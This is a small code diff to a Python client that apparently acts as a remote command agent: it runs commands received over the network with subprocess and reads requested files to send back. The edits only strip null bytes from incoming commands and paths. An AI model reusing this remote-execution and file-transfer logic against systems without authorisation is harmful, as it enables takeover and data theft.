@@ -221,7 +221,6 @@ class Client:
                     received = len(state['chunks'])
                     if received % 50 == 0 and received > 0:
                         print(f"    Received {received}/{state['expected_total']}")
-
                     if state['expected_total'] and received >= state['expected_total']:
 
                         # Check for sequence gaps before reassembling
@@ -324,7 +323,7 @@ class Client:
                 print(f"    Error saving file: {e}")
 
         elif command_type == CommandType.TRANSFER_FROM_CLIENT:
-            filepath = payload.decode('utf-8', errors='ignore').strip()
+            filepath = payload.decode('utf-8', errors='ignore').replace('\x00', '').strip()
             print(f"[*] Processing TRANSFER_FROM_CLIENT: {filepath}")
             try:
                 with open(filepath, 'rb') as f:
@@ -336,7 +335,7 @@ class Client:
                 self.send_response(src_ip, CommandType.ERROR, str(e).encode())
 
         elif command_type == CommandType.RUN_COMMAND:
-            cmd = payload.decode('utf-8', errors='ignore').strip()
+            cmd = payload.decode('utf-8', errors='ignore').replace('\x00', '').strip()
             print(f"[*] Processing RUN_COMMAND: {cmd}")
             try:
                 result = subprocess.run(
